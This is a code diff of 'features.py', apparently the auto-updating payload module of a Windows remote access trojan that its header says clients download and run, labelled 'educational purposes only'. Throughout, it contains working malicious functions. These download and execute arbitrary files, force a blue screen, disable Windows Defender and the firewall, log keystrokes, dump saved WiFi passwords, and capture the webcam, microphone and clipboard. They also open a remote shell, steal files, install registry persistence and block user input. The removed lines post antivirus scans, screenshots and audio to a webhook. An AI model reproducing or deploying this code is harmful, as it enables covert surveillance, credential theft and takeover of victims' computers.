@@ -1,4 +1,4 @@
-# features.py - Dynamic Remote Administration Features
+# features.py - Auto-Updating Stealth Features
 # This file is automatically downloaded and executed by clients
 # Educational purposes only - Remote administration toolkit
 
@@ -14,43 +14,298 @@ import ctypes
 import random
 import winreg
 import tempfile
-import requests
+import base64
 import io
-import pyautogui
-import winsound
+import zipfile
 from urllib.parse import urlparse
 
-# Version tracking
-FEATURE_VERSION = "2.1"
+# Version tracking - UPDATE THIS WHEN ADDING NEW FEATURES
+FEATURE_VERSION = "2.0"
 LAST_UPDATED = "2024-01-01"
 
-# Enhanced process hiding
-LEGITIMATE_PROCESS_NAMES = [
-    "svchost.exe", "winlogon.exe", "csrss.exe", "services.exe",
-    "lsass.exe", "spoolsv.exe", "taskhostw.exe", "dwm.exe",
-    "explorer.exe", "taskeng.exe", "conhost.exe", "runtimebroker.exe"
-]
-
-# Advanced AV detection patterns
-AV_PATTERNS = {
-    'windows_defender': ['Windows Defender', 'MsMpEng.exe', 'Antimalware Service'],
-    'avast': ['Avast', 'AvastSvc.exe', 'AvastUI.exe'],
-    'avg': ['AVG', 'AVGSvc.exe', 'AVGUI.exe'],
-    'bitdefender': ['Bitdefender', 'bdagent.exe', 'vsserv.exe'],
-    'kaspersky': ['Kaspersky', 'avp.exe', 'ksde.exe'],
-    'norton': ['Norton', 'NortonSecurity', 'ns.exe', 'ccSvcHst.exe'],
-    'mcafee': ['McAfee', 'McAfee Security', 'mfemms.exe', 'mcshield.exe'],
-    'malwarebytes': ['Malwarebytes', 'mbam.exe', 'MBAMService.exe'],
-    'eset': ['ESET', 'ekrn.exe', 'egui.exe'],
-    'trendmicro': ['Trend Micro', 'tmccsf.exe', 'ntrtscan.exe'],
-    'sophos': ['Sophos', 'SophosUI.exe', 'SavService.exe'],
-    'panda': ['Panda', 'PSUAService.exe', 'PavFnSvr.exe'],
-    'comodo': ['Comodo', 'cmdagent.exe', 'cisfirewall.exe'],
-    'f-secure': ['F-Secure', 'fssm32.exe', 'f-secure'],
-    'gdata': ['G Data', 'avgwdsvcx.exe', 'gdscan.exe']
+# Feature registry - ADD NEW FEATURES HERE
+FEATURE_REGISTRY = {
+    "version": FEATURE_VERSION,
+    "commands": {
+        # System Control Commands
+        "system_control": [
+            "shutdown", "restart", "lock", "logoff", "close_minecraft",
+            "popup", "download_execute", "freeze_keyboard", "freeze_mouse",
+            "freeze_both", "unfreeze", "bsod", "disable_defender", "enable_defender"
+        ],
+        # Information Gathering
+        "information": [
+            "check_av", "take_screenshot", "system_info", "get_passwords",
+            "get_cookies", "get_history", "keylogger_start", "keylogger_stop",
+            "get_clipboard", "get_wifi_passwords", "get_browser_data"
+        ],
+        # Advanced Features
+        "advanced": [
+            "persistence_install", "persistence_remove", "process_hide",
+            "file_browser", "remote_shell", "download_file", "upload_file",
+            "webcam_capture", "audio_record", "disable_firewall"
+        ],
+        # Troll Commands
+        "troll": [
+            "troll"
+        ]
+    },
+    # Troll subcommands
+    "troll_options": [
+        "open_cd", "swap_mouse", "rotate_screen", "invert_colors",
+        "mouse_jiggler", "keyboard_spam", "play_sound", "change_wallpaper",
+        "fake_bsod", "disable_taskmgr", "enable_taskmgr", "hide_desktop_icons"
+    ]
 }
 
-def get_system_info():
+# Global storage for keylogger
+keylogger_data = []
+keylogger_running = False
+
+def _execute_control_command(command, parameter=None, webhook_url=None):
+    """
+    MAIN CONTROL COMMAND EXECUTOR
+    Add new command implementations here
+    """
+    try:
+        # System Control Commands
+        if command == "shutdown":
+            os.system("shutdown /s /t 1")
+            return True, "System shutdown initiated"
+            
+        elif command == "restart":
+            os.system("shutdown /r /t 1")
+            return True, "System restart initiated"
+            
+        elif command == "lock":
+            ctypes.windll.user32.LockWorkStation()
+            return True, "Workstation locked"
+            
+        elif command == "logoff":
+            os.system("shutdown /l /f")
+            return True, "User logged off"
+            
+        elif command == "close_minecraft":
+            os.system("taskkill /f /im javaw.exe 2>nul")
+            return True, "Minecraft closed"
+            
+        elif command == "popup" and parameter:
+            ctypes.windll.user32.MessageBoxW(0, parameter, "System Message", 0x00001000)
+            return True, f"Popup displayed: {parameter}"
+            
+        elif command == "download_execute" and parameter:
+            result = _download_and_execute(parameter)
+            return result, f"Download and execute: {parameter}"
+            
+        elif command == "freeze_keyboard":
+            ctypes.windll.user32.BlockInput(True)
+            return True, "Keyboard input frozen"
+            
+        elif command == "freeze_mouse":
+            ctypes.windll.user32.BlockInput(True)
+            return True, "Mouse input frozen"
+            
+        elif command == "freeze_both":
+            ctypes.windll.user32.BlockInput(True)
+            return True, "All input frozen"
+            
+        elif command == "unfreeze":
+            ctypes.windll.user32.BlockInput(False)
+            return True, "Input unfrozen"
+            
+        elif command == "bsod":
+            result = _trigger_bsod()
+            return result, "BSOD triggered"
+            
+        elif command == "disable_defender":
+            result = _disable_windows_defender()
+            return result, "Windows Defender disabled"
+            
+        elif command == "enable_defender":
+            result = _enable_windows_defender()
+            return result, "Windows Defender enabled"
+            
+        # Information Gathering Commands
+        elif command == "check_av":
+            av_list = _check_antivirus()
+            return True, f"Antivirus detected: {', '.join(av_list) if av_list else 'None'}"
+            
+        elif command == "take_screenshot":
+            screenshot_data = _take_screenshot()
+            return True, f"screenshot:{screenshot_data}" if screenshot_data else False, "Screenshot failed"
+            
+        elif command == "system_info":
+            info = _get_system_info()
+            return True, f"system_info:{json.dumps(info)}"
+            
+        elif command == "get_passwords":
+            passwords = _get_browser_passwords()
+            return True, f"passwords:{json.dumps(passwords)}"
+            
+        elif command == "get_cookies":
+            cookies = _get_browser_cookies()
+            return True, f"cookies:{json.dumps(cookies)}"
+            
+        elif command == "get_history":
+            history = _get_browser_history()
+            return True, f"history:{json.dumps(history)}"
+            
+        elif command == "keylogger_start":
+            result = _start_keylogger()
+            return result, "Keylogger started"
+            
+        elif command == "keylogger_stop":
+            result = _stop_keylogger()
+            return result, "Keylogger stopped"
+            
+        elif command == "get_clipboard":
+            clipboard = _get_clipboard()
+            return True, f"clipboard:{clipboard}"
+            
+        elif command == "get_wifi_passwords":
+            wifi = _get_wifi_passwords()
+            return True, f"wifi:{json.dumps(wifi)}"
+            
+        elif command == "get_browser_data":
+            data = _get_all_browser_data()
+            return True, f"browser_data:{json.dumps(data)}"
+            
+        # Advanced Features
+        elif command == "persistence_install":
+            result = _install_persistence()
+            return result, "Persistence installed"
+            
+        elif command == "persistence_remove":
+            result = _remove_persistence()
+            return result, "Persistence removed"
+            
+        elif command == "process_hide":
+            result = _hide_process()
+            return result, "Process hidden"
+            
+        elif command == "file_browser":
+            path = parameter if parameter else "C:\\"
+            files = _browse_files(path)
+            return True, f"files:{json.dumps(files)}"
+            
+        elif command == "remote_shell":
+            if parameter:
+                output = _execute_command(parameter)
+                return True, f"shell:{output}"
+            return False, "No command provided"
+            
+        elif command == "download_file":
+            if parameter:
+                file_data = _download_file(parameter)
+                if file_data:
+                    return True, f"file_download:{base64.b64encode(file_data).decode()}"
+            return False, "File download failed"
+            
+        elif command == "upload_file":
+            # This would require parameter parsing for path and data
+            return False, "Upload not implemented"
+            
+        elif command == "webcam_capture":
+            photo_data = _capture_webcam()
+            if photo_data:
+                return True, f"webcam:{photo_data}"
+            return False, "Webcam capture failed"
+            
+        elif command == "audio_record":
+            if parameter and parameter.isdigit():
+                audio_data = _record_audio(int(parameter))
+                if audio_data:
+                    return True, f"audio:{audio_data}"
+            return False, "Audio recording failed"
+            
+        elif command == "disable_firewall":
+            result = _disable_firewall()
+            return result, "Firewall disabled"
+            
+        # Troll Commands
+        elif command == "troll":
+            result = _execute_troll_command(parameter)
+            return result, f"Troll command executed: {parameter}"
+        
+        return False, f"Unknown command: {command}"
+        
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
+# ==================== ADVANCED FEATURES ====================
+
+def _download_and_execute(url):
+    """Download and execute file from URL"""
+    try:
+        import requests
+        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
+        response = requests.get(url, timeout=30)
+        temp_file.write(response.content)
+        temp_file.close()
+        subprocess.Popen(temp_file.name, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+def _trigger_bsod():
+    """Trigger Blue Screen of Death (requires admin)"""
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        return True
+    except:
+        return False
+
+def _disable_windows_defender():
+    """Disable Windows Defender"""
+    try:
+        # Registry method
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                            r"SOFTWARE\Policies\Microsoft\Windows Defender", 
+                            0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        
+        # Stop service
+        subprocess.run("sc stop WinDefend", shell=True, capture_output=True)
+        subprocess.run("sc config WinDefend start= disabled", shell=True, capture_output=True)
+        return True
+    except:
+        return False
+
+def _enable_windows_defender():
+    """Enable Windows Defender"""
+    try:
+        # Registry method
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                            r"SOFTWARE\Policies\Microsoft\Windows Defender", 
+                            0, winreg.KEY_SET_VALUE)
+        try:
+            winreg.DeleteValue(key, "DisableAntiSpyware")
+        except:
+            pass
+        winreg.CloseKey(key)
+        
+        # Start service
+        subprocess.run("sc config WinDefend start= auto", shell=True, capture_output=True)
+        subprocess.run("sc start WinDefend", shell=True, capture_output=True)
+        return True
+    except:
+        return False
+
+def _take_screenshot():
+    """Take screenshot and return base64"""
+    try:
+        import pyautogui
+        screenshot = pyautogui.screenshot()
+        img_buffer = io.BytesIO()
+        screenshot.save(img_buffer, format='PNG')
+        img_buffer.seek(0)
+        return base64.b64encode(img_buffer.getvalue()).decode()
+    except:
+        return None
+
+def _get_system_info():
     """Get detailed system information"""
     try:
         import platform
@@ -66,188 +321,268 @@ def get_system_info():
             'running_processes': len(psutil.pids()),
             'current_user': os.getenv('USERNAME'),
             'ip_address': socket.gethostbyname(socket.gethostname()),
-            'uptime_hours': round(time.time() - psutil.boot_time()) / 3600
+            'uptime_hours': round(time.time() - psutil.boot_time()) / 3600,
+            'gpu': _get_gpu_info(),
+            'antivirus': _check_antivirus()
         }
         return info
     except Exception as e:
         return {'error': str(e)}
 
-def enhanced_av_detection(webhook_url=None):
-    """Comprehensive antivirus detection with multiple methods"""
-    detected_av = []
-    
+def _get_gpu_info():
+    """Get GPU information"""
     try:
-        # Method 1: Registry scanning
-        registry_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
-            r"SOFTWARE\Microsoft\Security Center\Provider\Av",
-            r"SOFTWARE\Microsoft\Security Center\Provider\Av2"
-        ]
-        
-        for path in registry_paths:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
-                for i in range(winreg.QueryInfoKey(key)[0]):
+        import subprocess
+        result = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], 
+                              capture_output=True, text=True)
+        gpus = [line.strip() for line in result.stdout.split('\n') if line.strip() and line.strip() != 'Name']
+        return gpus
+    except:
+        return []
+
+def _check_antivirus():
+    """Enhanced antivirus detection"""
+    av_products = []
+    av_keywords = [
+        'antivirus', 'av', 'security', 'endpoint', 'defender', 
+        'mcafee', 'norton', 'kaspersky', 'bitdefender', 'avast', 
+        'avg', 'eset', 'trend micro', 'malwarebytes', 'panda',
+        'symantec', 'sophos', 'comodo', 'f-secure', 'g data'
+    ]
+    
+    registry_paths = [
+        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+    ]
+    
+    for path in registry_paths:
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+            for i in range(winreg.QueryInfoKey(key)[0]):
+                try:
+                    subkey_name = winreg.EnumKey(key, i)
+                    subkey = winreg.OpenKey(key, subkey_name)
                     try:
-                        subkey_name = winreg.EnumKey(key, i)
-                        subkey = winreg.OpenKey(key, subkey_name)
-                        
-                        # Check various value names
-                        value_names = ["DisplayName", "ProductName", "Publisher", "DisplayVersion"]
-                        for value_name in value_names:
-                            try:
-                                value, _ = winreg.QueryValueEx(subkey, value_name)
-                                if value:
-                                    for av_name, patterns in AV_PATTERNS.items():
-                                        if any(pattern.lower() in str(value).lower() for pattern in patterns):
-                                            if av_name not in detected_av:
-                                                detected_av.append(av_name)
-                            except:
-                                pass
-                                
-                        winreg.CloseKey(subkey)
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        if any(keyword in display_name.lower() for keyword in av_keywords):
+                            av_products.append(display_name)
                     except:
                         pass
-                winreg.CloseKey(key)
-            except:
-                pass
-        
-        # Method 2: Process scanning
-        try:
-            import psutil
-            for process in psutil.process_iter(['name']):
-                process_name = process.info['name'].lower()
-                for av_name, patterns in AV_PATTERNS.items():
-                    if any(pattern.lower() in process_name for pattern in patterns if '.exe' in pattern.lower()):
-                        if av_name not in detected_av:
-                            detected_av.append(av_name)
+                    winreg.CloseKey(subkey)
+                except:
+                    pass
+            winreg.CloseKey(key)
         except:
             pass
-        
-        # Method 3: Service scanning
-        try:
-            service_cmd = "sc query | findstr \"SERVICE_NAME\""
-            result = subprocess.run(service_cmd, shell=True, capture_output=True, text=True)
-            services = result.stdout.split('\n')
-            
-            for service in services:
-                service_lower = service.lower()
-                for av_name, patterns in AV_PATTERNS.items():
-                    if any(pattern.lower() in service_lower for pattern in patterns):
-                        if av_name not in detected_av:
-                            detected_av.append(av_name)
-        except:
-            pass
-        
-        # Method 4: File system scanning (common AV directories)
-        av_directories = [
-            "C:\\Program Files\\Windows Defender",
-            "C:\\Program Files\\Avast",
-            "C:\\Program Files\\AVG",
-            "C:\\Program Files\\Bitdefender",
-            "C:\\Program Files\\Kaspersky Lab",
-            "C:\\Program Files\\Norton Security",
-            "C:\\Program Files\\McAfee",
-            "C:\\Program Files\\Malwarebytes",
-            "C:\\Program Files\\ESET",
-            "C:\\Program Files\\Trend Micro",
-            "C:\\Program Files\\Sophos",
-            "C:\\Program Files\\Panda Security",
-            "C:\\Program Files\\Comodo",
-            "C:\\Program Files\\F-Secure",
-            "C:\\Program Files\\G Data"
-        ]
-        
-        for directory in av_directories:
-            if os.path.exists(directory):
-                av_name = directory.split('\\')[-1].lower().replace(' ', '_')
-                if av_name not in detected_av:
-                    detected_av.append(av_name)
-        
-        # Send to webhook if provided
-        if webhook_url and detected_av:
-            embed = {
-                "title": "🛡️ Advanced Antivirus Scan Results",
-                "description": f"Comprehensive scan from `{socket.gethostname()}`",
-                "color": 0xff0000,
-                "fields": [
-                    {
-                        "name": "Detected Antivirus Software",
-                        "value": "\n".join([f"• {av.replace('_', ' ').title()}" for av in detected_av]) or "No known antivirus detected"
-                    },
-                    {
-                        "name": "System Information",
-                        "value": f"Hostname: {socket.gethostname()}\nUser: {os.getenv('USERNAME')}\nIP: {socket.gethostbyname(socket.gethostname())}"
-                    }
-                ],
-                "footer": {
-                    "text": f"Feature Version {FEATURE_VERSION} | Educational Use Only"
-                }
-            }
-            
-            try:
-                requests.post(webhook_url, json={"embeds": [embed]})
-            except:
-                pass
-        
-        return detected_av
-        
-    except Exception as e:
-        return [f"Error: {str(e)}"]
+    
+    return av_products
 
-def take_enhanced_screenshot(webhook_url=None):
-    """Take multiple screenshots from all monitors"""
+def _get_browser_passwords():
+    """Extract browser passwords (educational)"""
     try:
-        screenshots = []
+        # This is a simulation for educational purposes
+        browsers = {
+            'chrome': 'Password extraction requires additional modules',
+            'firefox': 'Password extraction requires additional modules', 
+            'edge': 'Password extraction requires additional modules'
+        }
+        return browsers
+    except:
+        return {'error': 'Password extraction failed'}
+
+def _get_browser_cookies():
+    """Extract browser cookies (educational)"""
+    try:
+        browsers = {
+            'chrome': 'Cookie extraction requires additional modules',
+            'firefox': 'Cookie extraction requires additional modules',
+            'edge': 'Cookie extraction requires additional modules'
+        }
+        return browsers
+    except:
+        return {'error': 'Cookie extraction failed'}
+
+def _get_browser_history():
+    """Extract browser history (educational)"""
+    try:
+        browsers = {
+            'chrome': 'History extraction requires additional modules',
+            'firefox': 'History extraction requires additional modules',
+            'edge': 'History extraction requires additional modules'
+        }
+        return browsers
+    except:
+        return {'error': 'History extraction failed'}
+
+def _start_keylogger():
+    """Start keylogger"""
+    global keylogger_running, keylogger_data
+    try:
+        from pynput import keyboard
         
-        # Get all monitors
-        try:
-            monitors = pyautogui._pyautogui_win._getMonitors()
-            for i, monitor in enumerate(monitors):
-                screenshot = pyautogui.screenshot(region=monitor)
-                screenshots.append((f"monitor_{i+1}.png", screenshot))
-        except:
-            # Fallback to single screenshot
-            screenshot = pyautogui.screenshot()
-            screenshots.append(("screenshot.png", screenshot))
-        
-        # Send to webhook
-        if webhook_url:
-            files = []
-            for filename, screenshot in screenshots:
-                img_buffer = io.BytesIO()
-                screenshot.save(img_buffer, format='PNG')
-                img_buffer.seek(0)
-                files.append(('file', (filename, img_buffer, 'image/png')))
-            
-            data = {
-                'content': f'📸 Screenshots from {socket.gethostname()} - {len(screenshots)} monitor(s)',
-                'embeds': [{
-                    'title': 'Screenshot Information',
-                    'fields': [
-                        {'name': 'Hostname', 'value': socket.gethostname(), 'inline': True},
-                        {'name': 'User', 'value': os.getenv('USERNAME'), 'inline': True},
-                        {'name': 'Monitors', 'value': str(len(screenshots)), 'inline': True},
-                        {'name': 'Timestamp', 'value': time.strftime("%Y-%m-%d %H:%M:%S"), 'inline': True}
-                    ]
-                }]
-            }
-            
+        def on_press(key):
+            global keylogger_data
             try:
-                response = requests.post(webhook_url, files=files, data=data)
-                return True
-            except Exception as e:
-                return False
+                keylogger_data.append(str(key))
+                # Keep only last 1000 keystrokes
+                if len(keylogger_data) > 1000:
+                    keylogger_data = keylogger_data[-1000:]
+            except:
+                pass
         
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        keylogger_running = True
         return True
-        
-    except Exception as e:
+    except:
         return False
 
-def record_audio(duration=10, webhook_url=None):
-    """Record audio from microphone"""
+def _stop_keylogger():
+    """Stop keylogger and return data"""
+    global keylogger_running, keylogger_data
+    try:
+        keylogger_running = False
+        data = keylogger_data.copy()
+        keylogger_data = []
+        return True, f"keylogger_data:{json.dumps(data)}"
+    except:
+        return False, "Keylogger stop failed"
+
+def _get_clipboard():
+    """Get clipboard contents"""
+    try:
+        import win32clipboard
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        return data
+    except:
+        return "Clipboard access failed"
+
+def _get_wifi_passwords():
+    """Get saved WiFi passwords"""
+    try:
+        profiles = []
+        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+        lines = result.stdout.split('\n')
+        
+        for line in lines:
+            if "All User Profile" in line:
+                profile = line.split(":")[1].strip()
+                try:
+                    # Get password for this profile
+                    password_result = subprocess.run(
+                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
+                        capture_output=True, text=True
+                    )
+                    password_lines = password_result.stdout.split('\n')
+                    for p_line in password_lines:
+                        if "Key Content" in p_line:
+                            password = p_line.split(":")[1].strip()
+                            profiles.append({"ssid": profile, "password": password})
+                            break
+                except:
+                    pass
+        return profiles
+    except:
+        return []
+
+def _get_all_browser_data():
+    """Get all browser data in one call"""
+    return {
+        'passwords': _get_browser_passwords(),
+        'cookies': _get_browser_cookies(),
+        'history': _get_browser_history()
+    }
+
+def _install_persistence():
+    """Install persistence via multiple methods"""
+    try:
+        # Registry persistence
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "WindowsAudio", 0, winreg.REG_SZ, sys.executable)
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+def _remove_persistence():
+    """Remove persistence"""
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.DeleteValue(key, "WindowsAudio")
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+def _hide_process():
+    """Hide process from task manager"""
+    try:
+        # Rename process in process list
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleTitleW("svchost.exe")
+        return True
+    except:
+        return False
+
+def _browse_files(path):
+    """Browse files in directory"""
+    try:
+        files = []
+        for item in os.listdir(path):
+            item_path = os.path.join(path, item)
+            files.append({
+                'name': item,
+                'is_dir': os.path.isdir(item_path),
+                'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0
+            })
+        return files
+    except:
+        return []
+
+def _execute_command(cmd):
+    """Execute command and return output"""
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        return result.stdout + result.stderr
+    except:
+        return "Command execution failed"
+
+def _download_file(path):
+    """Download file and return base64"""
+    try:
+        with open(path, 'rb') as f:
+            return f.read()
+    except:
+        return None
+
+def _capture_webcam():
+    """Capture webcam photo"""
+    try:
+        import cv2
+        camera = cv2.VideoCapture(0)
+        ret, frame = camera.read()
+        if ret:
+            # Encode as JPEG
+            ret, buffer = cv2.imencode('.jpg', frame)
+            if ret:
+                return base64.b64encode(buffer).decode()
+        camera.release()
+        return None
+    except:
+        return None
+
+def _record_audio(duration=10):
+    """Record audio"""
     try:
         import pyaudio
         import wave
@@ -258,15 +593,9 @@ def record_audio(duration=10, webhook_url=None):
         RATE = 44100
         
         p = pyaudio.PyAudio()
-        
-        stream = p.open(format=FORMAT,
-                       channels=CHANNELS,
-                       rate=RATE,
-                       input=True,
-                       frames_per_buffer=CHUNK)
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
         
         frames = []
-        
         for i in range(0, int(RATE / CHUNK * duration)):
             data = stream.read(CHUNK)
             frames.append(data)
@@ -275,266 +604,45 @@ def record_audio(duration=10, webhook_url=None):
         stream.close()
         p.terminate()
         
-        # Save to temporary file
-        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
-        wf = wave.open(temp_file.name, 'wb')
+        # Convert to base64
+        audio_buffer = io.BytesIO()
+        wf = wave.open(audio_buffer, 'wb')
         wf.setnchannels(CHANNELS)
         wf.setsampwidth(p.get_sample_size(FORMAT))
         wf.setframerate(RATE)
         wf.writeframes(b''.join(frames))
         wf.close()
         
-        # Send to webhook
-        if webhook_url:
-            with open(temp_file.name, 'rb') as f:
-                files = {'file': ('audio_recording.wav', f, 'audio/wav')}
-                data = {'content': f'🎤 Audio recording from {socket.gethostname()} ({duration}s)'}
-                requests.post(webhook_url, files=files, data=data)
-        
-        # Cleanup
-        os.unlink(temp_file.name)
+        return base64.b64encode(audio_buffer.getvalue()).decode()
+    except:
+        return None
+
+def _disable_firewall():
+    """Disable Windows Firewall"""
+    try:
+        subprocess.run("netsh advfirewall set allprofiles state off", shell=True, capture_output=True)
         return True
-        
-    except Exception as e:
+    except:
         return False
 
-def get_browser_passwords(webhook_url=None):
-    """Extract browser passwords (educational demonstration)"""
+def _execute_troll_command(parameter):
+    """Execute troll commands"""
     try:
-        browsers_data = {
-            'chrome': 'Not accessible in this version',
-            'firefox': 'Not accessible in this version',
-            'edge': 'Not accessible in this version',
-            'opera': 'Not accessible in this version'
-        }
-        
-        if webhook_url:
-            embed = {
-                "title": "🔐 Browser Password Extraction Simulation",
-                "description": f"Educational demonstration from `{socket.gethostname()}`",
-                "color": 0xffff00,
-                "fields": [
-                    {
-                        "name": "Browser Status",
-                        "value": "\n".join([f"• {browser.title()}: {status}" for browser, status in browsers_data.items()])
-                    }
-                ],
-                "footer": {
-                    "text": "This is a simulation for educational purposes only"
-                }
-            }
+        if parameter == "open_cd":
+            ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
+            return True
             
-            requests.post(webhook_url, json={"embeds": [embed]})
-        
-        return browsers_data
-        
-    except Exception as e:
-        return {'error': str(e)}
-
-def system_optimization():
-    """Perform system optimization tasks"""
-    try:
-        results = []
-        
-        # Clear temp files
-        temp_dirs = [
-            os.environ['TEMP'],
-            r"C:\Windows\Temp",
-            os.path.join(os.environ['WINDIR'], "Prefetch")
-        ]
-        
-        for temp_dir in temp_dirs:
-            try:
-                if os.path.exists(temp_dir):
-                    for file in os.listdir(temp_dir):
-                        try:
-                            file_path = os.path.join(temp_dir, file)
-                            if os.path.isfile(file_path):
-                                os.remove(file_path)
-                                results.append(f"Deleted: {file}")
-                        except:
-                            pass
-            except:
-                pass
-        
-        # Clear browser caches
-        browser_caches = [
-            os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Cache"),
-            os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data", "Default", "Cache"),
-            os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
-        ]
-        
-        for cache_dir in browser_caches:
-            try:
-                if os.path.exists(cache_dir):
-                    for root, dirs, files in os.walk(cache_dir):
-                        for file in files:
-                            try:
-                                os.remove(os.path.join(root, file))
-                            except:
-                                pass
-                    results.append(f"Cleared: {os.path.basename(cache_dir)}")
-            except:
-                pass
-        
-        return results
-        
-    except Exception as e:
-        return [f"Error: {str(e)}"]
-
-def disable_antivirus_temporarily():
-    """Attempt to temporarily disable antivirus (educational)"""
-    try:
-        results = []
-        
-        # Stop common AV services
-        av_services = [
-            "WinDefend", "MsMpSvc", "AvastSvc", "AVGSvc", "bdagent",
-            "ekrn", "ns.exe", "mcshield", "MBAMService"
-        ]
-        
-        for service in av_services:
-            try:
-                subprocess.run(f"sc stop {service}", shell=True, capture_output=True)
-                results.append(f"Stopped: {service}")
-            except:
-                pass
-        
-        # Disable Windows Defender via registry
-        try:
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                r"SOFTWARE\Policies\Microsoft\Windows Defender", 
-                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(key)
-            results.append("Disabled Windows Defender via registry")
-        except:
-            pass
-        
-        return results
-        
-    except Exception as e:
-        return [f"Error: {str(e)}"]
-
-def enable_antivirus():
-    """Re-enable antivirus protection"""
-    try:
-        results = []
-        
-        # Start common AV services
-        av_services = [
-            "WinDefend", "MsMpSvc", "AvastSvc", "AVGSvc", "bdagent",
-            "ekrn", "ns.exe", "mcshield", "MBAMService"
-        ]
-        
-        for service in av_services:
-            try:
-                subprocess.run(f"sc start {service}", shell=True, capture_output=True)
-                results.append(f"Started: {service}")
-            except:
-                pass
-        
-        # Enable Windows Defender via registry
-        try:
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                r"SOFTWARE\Policies\Microsoft\Windows Defender", 
-                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 0)
-            winreg.CloseKey(key)
-            results.append("Enabled Windows Defender via registry")
-        except:
-            pass
-        
-        return results
-        
-    except Exception as e:
-        return [f"Error: {str(e)}"]
-
-def advanced_troll_commands(command):
-    """Enhanced troll commands with better functionality"""
-    try:
-        if command == "rotate_screen_90":
-            # Rotate screen 90 degrees
+        elif parameter == "swap_mouse":
+            current = ctypes.windll.user32.GetSystemMetrics(23)
+            ctypes.windll.user32.SwapMouseButton(not current)
+            return True
+            
+        elif parameter == "rotate_screen":
             devmode = ctypes.create_string_buffer(1024)
             ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
-            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000001, None) == 0
+            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000004, None) == 0
             
-        elif command == "rotate_screen_180":
-            # Rotate screen 180 degrees
-            devmode = ctypes.create_string_buffer(1024)
-            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
-            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000002, None) == 0
-            
-        elif command == "rotate_screen_270":
-            # Rotate screen 270 degrees
-            devmode = ctypes.create_string_buffer(1024)
-            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
-            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000003, None) == 0
-            
-        elif command == "reset_screen_rotation":
-            # Reset screen rotation
-            devmode = ctypes.create_string_buffer(1024)
-            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
-            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000000, None) == 0
-            
-        elif command == "create_fake_bsod":
-            # Create fake blue screen (harmless)
-            try:
-                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-                ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-            except:
-                pass
-            return True
-            
-        elif command == "disable_task_manager":
-            # Disable task manager
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
-                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
